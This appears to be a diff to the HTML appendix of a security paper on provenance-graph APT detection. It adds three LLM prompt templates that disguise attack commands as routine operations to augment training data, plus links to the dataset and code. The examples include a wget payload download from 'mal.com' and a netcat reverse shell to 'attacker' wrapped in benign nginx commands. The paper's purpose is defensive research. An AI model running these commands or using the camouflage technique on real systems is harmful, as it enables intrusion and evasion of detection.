@@ -69,11 +69,11 @@ Supplementary content moved out of the main paper due to space limits.
 <ul>
   <li><a href="#algo1">A. Algorithm 1 — Structural Mutation</a></li>
   <li><a href="#prompt1">B. Prompt Template — Edge Mutation</a></li>
-  <li><a href="#prompt2">C. Prompt Template — Semantic Mutation</a></li>
+  <li><a href="#prompt2">C. Prompt Templates — Semantic Mutation (C.1 Replacement / C.2 Rewriting / C.3 Extension)</a></li>
   <li><a href="#hyperparam">D. Additional Hyperparameter Analysis (GNN Layers and Embedding Dimension)</a></li>
   <li><a href="#llmconfig">E. LLM Configuration &amp; Reproducibility</a></li>
   <li><a href="#rq1ext">F. Extended RQ1 Results (Additional Host Sub-datasets)</a></li>
-  <li><a href="#dataset">G. Annotated Dataset</a></li>
+  <li><a href="#dataset">G. Annotated Dataset &amp; Source Code</a></li>
   <li><a href="#rating">H. Verification Ablation — Rating Protocol &amp; Per-Variant Scores</a></li>
   <li><a href="#attckcase">I. ATT&amp;CK Mapping Failure Cases (STE &amp; CTE)</a></li>
 </ul>
@@ -145,36 +145,99 @@ Supplementary content moved out of the main paper due to space limits.
 <br>JSON: <code>[{edge_id, action: ADD|REMOVE|KEEP, reason}]</code>.
 </div>
 
-<h2 id="prompt2">C. Prompt Template — Semantic Mutation</h2>
+<h2 id="prompt2">C. Prompt Templates — Semantic Mutation</h2>
 
-<p>Referenced from §4.3.2 Semantic Mutation in the main paper.</p>
+<p>Referenced from §4.3.2 Semantic Mutation in the main paper. The main paper specifies three mutation strategies (Replacement, Rewriting, Extension) selected by whether the process node's command name and arguments are observed in the benign history <code>𝓗_b</code>; <strong>each strategy has its own prompt template</strong>, listed below as C.1, C.2, and C.3. All three share the same JSON output schema and the same global constraints.</p>
+
+<h3>C.1 Replacement Prompt</h3>
+
+<p>Triggered when exactly one of the command name or arguments is unseen in <code>𝓗_b</code>: the unseen component is attack-specific and preserved; the observed one is rewritten with benign values guided by the surrounding context <code>C</code>.</p>
 
 <div class="prompt">
-<div class="title">Prompt: Semantic Mutation</div>
+<div class="title">Prompt C.1: Replacement</div>
 
 <span class="label">[Context]</span>
-<br>The following attack process nodes are embedded in a provenance graph with their associated file/network nodes and <code>r</code>-hop benign context <code>C</code>.
+<br>The following attack process node is embedded in a provenance graph with its associated file/network nodes and <code>r</code>-hop benign context <code>C</code>. Exactly one of the command name or arguments is attack-specific (unseen in benign history <code>𝓗_b</code>) and must be preserved; the other is benign-compatible and must be replaced with values that blend into <code>C</code>.
 
 <br><span class="label">[Input]</span>
-<br><code>{n}</code> process nodes:
-<br>&nbsp;&nbsp;&nbsp;&nbsp;Node 1: attributes=<code>{attributes}</code>, associated_nodes=<code>{file/network_attributes}</code>, strategy=<code>{assigned_strategy}</code>, preserve=<code>{critical_component}</code>, C=<code>{context_triples}</code>
-<br>&nbsp;&nbsp;&nbsp;&nbsp;...
-<br>&nbsp;&nbsp;&nbsp;&nbsp;Node n: attributes=<code>{attributes}</code>, associated_nodes=<code>{file/network_attributes}</code>, strategy=<code>{assigned_strategy}</code>, preserve=<code>{critical_component}</code>, C=<code>{context_triples}</code>
+<br>Process node:
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>command_name</code>=<code>{name}</code>, <code>arguments</code>=<code>{args}</code>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>associated_nodes</code>=<code>{file/network_attributes}</code>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>preserve</code>=<code>{"command_name" | "arguments"}</code> &nbsp;(the attack-specific component)
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>C</code>=<code>{context_triples}</code> &nbsp;(neighboring events as (src_type:attr, op, dst_type:attr))
 
 <br><span class="label">[Task]</span>
-<br>Mutate each process node's attributes via its assigned strategy:
-<br>&nbsp;&nbsp;&nbsp;&nbsp;A. <strong>Replacement</strong>: preserve the component indicated by <em>preserve</em> and replace the other with benign values guided by C.
-<br>&nbsp;&nbsp;&nbsp;&nbsp;B. <strong>Rewriting</strong>: rewrite the entire command into a different expression guided by C that fits the surrounding benign context.
-<br>&nbsp;&nbsp;&nbsp;&nbsp;C. <strong>Extension</strong>: preserve entire command, prepend/append benign operations from C.
+<br>Keep the component indicated by <code>preserve</code> exactly as given. Substitute the other component with benign values drawn from or compatible with <code>C</code>, so the resulting full command appears as a routine operation in the surrounding context. Propagate any required attribute updates to associated file/network nodes.
 
-<br>For each mutated process node, also output updated attributes for any associated file or network nodes whose values change.
-
-<br><br><strong>Constraints</strong>:
+<br><span class="label">[Constraints]</span>
 <br>(1) generated values must be legitimate system commands, file names, or IP addresses;
-<br>(2) mutated values must be compatible with neighboring operations in C.
+<br>(2) mutated values must be compatible with neighboring operations in <code>C</code>;
+<br>(3) the preserved component must appear verbatim in the output.
 
 <br><span class="label">[Output]</span>
-<br>JSON: <code>[{node_id, new_attributes, associated_updates}]</code>.
+<br>JSON: <code>{node_id, new_command_name, new_arguments, associated_updates}</code>.
+
+<br><br><strong>Example.</strong> Input: <code>wget http://mal.com/pay.sh</code>, <code>preserve="arguments"</code>, <code>C</code> = web-monitoring context. Output: <code>curl -H "X-Health-Check: true" http://mal.com/pay.sh</code>.
+</div>
+
+<h3>C.2 Rewriting Prompt</h3>
+
+<p>Triggered when both the command name and arguments are observed in <code>𝓗_b</code>: neither is attack-specific. The LLM rewrites the entire command into a different expression that better fits the surrounding benign context while preserving the attack's causal effect on associated nodes.</p>
+
+<div class="prompt">
+<div class="title">Prompt C.2: Rewriting</div>
+
+<span class="label">[Context]</span>
+<br>The attack process node's command name and arguments are both observed in benign history <code>𝓗_b</code>, so neither is attack-specific. The full command is therefore free to be rewritten into a semantically different expression as long as the causal effect on the associated file/network nodes is preserved.
+
+<br><span class="label">[Input]</span>
+<br>Process node:
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>command_name</code>=<code>{name}</code>, <code>arguments</code>=<code>{args}</code>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>associated_nodes</code>=<code>{file/network_attributes}</code>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>C</code>=<code>{context_triples}</code>
+
+<br><span class="label">[Task]</span>
+<br>Rewrite the full command (new command name and new arguments) into a different expression that fits the surrounding benign context <code>C</code> (e.g., match the dominant process type observed in <code>C</code>). The causal effect on associated file/network nodes must be preserved; update their attributes accordingly.
+
+<br><span class="label">[Constraints]</span>
+<br>(1) the rewritten command must be a legitimate executable + arguments combination;
+<br>(2) it must be plausible within the dominant process type in <code>C</code>;
+<br>(3) any file/network node attributes affected by the change must be updated consistently.
+
+<br><span class="label">[Output]</span>
+<br>JSON: <code>{node_id, new_command_name, new_arguments, associated_updates}</code>.
+
+<br><br><strong>Example.</strong> Input: <code>python /tmp/script.py</code>, <code>C</code> dominated by nginx/php processes. Output: <code>php /var/www/cgi-bin/handler.php</code>.
+</div>
+
+<h3>C.3 Extension Prompt</h3>
+
+<p>Triggered when both the command name and arguments are unseen in <code>𝓗_b</code>: both are attack-specific and must be preserved. The LLM prepends or appends benign operations drawn from <code>C</code> to embed the malicious command within a longer workflow that looks like a routine sequence.</p>
+
+<div class="prompt">
+<div class="title">Prompt C.3: Extension</div>
+
+<span class="label">[Context]</span>
+<br>Both the command name and arguments are attack-specific (unseen in benign history <code>𝓗_b</code>) and must be preserved verbatim. The mutation extends the command by prepending and/or appending benign operations drawn from <code>C</code> so the malicious payload is wrapped inside a plausible diagnostic, maintenance, or monitoring workflow.
+
+<br><span class="label">[Input]</span>
+<br>Process node:
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>command_name</code>=<code>{name}</code>, <code>arguments</code>=<code>{args}</code>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>associated_nodes</code>=<code>{file/network_attributes}</code>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>C</code>=<code>{context_triples}</code>
+
+<br><span class="label">[Task]</span>
+<br>Compose an extended command of the form <code>&lt;benign_prefix&gt; &amp;&amp; &lt;original&gt; &amp;&amp; &lt;benign_suffix&gt;</code>, where prefix and suffix are short benign commands taken from or consistent with <code>C</code> (e.g., a status check, a routine log echo). The original command must appear verbatim in the middle. Either the prefix or the suffix may be empty if a single side is sufficient to make the workflow plausible.
+
+<br><span class="label">[Constraints]</span>
+<br>(1) the original command name and arguments must appear exactly as given;
+<br>(2) the prefix/suffix commands must be legitimate and consistent with <code>C</code>;
+<br>(3) shell-level chaining must use plain operators (<code>&amp;&amp;</code>, <code>;</code>) that are common in <code>C</code>.
+
+<br><span class="label">[Output]</span>
+<br>JSON: <code>{node_id, new_command_name, new_arguments, associated_updates}</code>.
+
+<br><br><strong>Example.</strong> Input: <code>nc -e /bin/sh attacker 4444</code>, <code>C</code> dominated by nginx admin checks. Output: <code>systemctl status nginx &amp;&amp; nc -e /bin/sh attacker 4444 &amp;&amp; echo "connection test"</code>.
 </div>
 
 <h2 id="hyperparam">D. Additional Hyperparameter Analysis (GNN Layers and Embedding Dimension)</h2>
@@ -297,13 +360,25 @@ python -m vllm.entrypoints.openai.api_server \
 
 <p>All results use the same train/test split, hyperparameters, and evaluation protocol described in §V of the main paper.</p>
 
-<h2 id="dataset">G. Annotated Dataset</h2>
+<h2 id="dataset">G. Annotated Dataset &amp; Source Code</h2>
+
+<p>Referenced from §V Setup (L603) and §V RQ3 setup (L666) in the main paper. Both the annotated dataset and the source code are released together for full reproducibility.</p>
+
+<h3>G.1 Annotated Dataset</h3>
 
 <p>The annotated APT detection dataset (manually verified malicious entity labels and ATT&amp;CK technique labels for each malicious snapshot across DARPA E3, DARPA E5, ATLAS, and OpTC) is publicly available at:</p>
 
 <p><a href="https://anonymous.4open.science/r/APT-ATHENA"><code>https://anonymous.4open.science/r/APT-ATHENA</code></a></p>
 
 <p>The annotations were performed by three doctoral researchers in system security based on official attack reports. The dataset includes provenance graph snapshots, malicious entity labels, and ATT&amp;CK technique mappings used in the experiments reported in §V of the main paper.</p>
+
+<h3>G.2 Source Code</h3>
+
+<p>The full ATHENA implementation — including snapshot construction, LLM-guided graph augmentation (structural + semantic mutation), unified verification, adaptive contrastive learning (3-layer GIN + GRU + MLP), and global attack interpretation (Sentence-BERT mapping + LCS alignment) — is released at:</p>
+
+<p><a href="https://github.com/xinguohua/athena"><code>https://github.com/xinguohua/athena</code></a></p>
+
+<p>The repository contains: (i) reproducible training/eval scripts for each dataset in <em>tab:accrute</em>; (ii) the prompt registry (Edge Mutation + Replacement / Rewriting / Extension) used in our LLM calls; (iii) the four unified-verification checks; (iv) hyperparameter configurations (time-window length <code>T</code>, neighborhood radius <code>r</code>, GNN layers <code>L</code>, embedding dimension <code>D</code>); and (v) the ATT&amp;CK technique knowledge base with action-triplet enhancement.</p>
 
 <h2 id="rating">H. Verification Ablation — Rating Protocol &amp; Per-Variant Scores</h2>
 
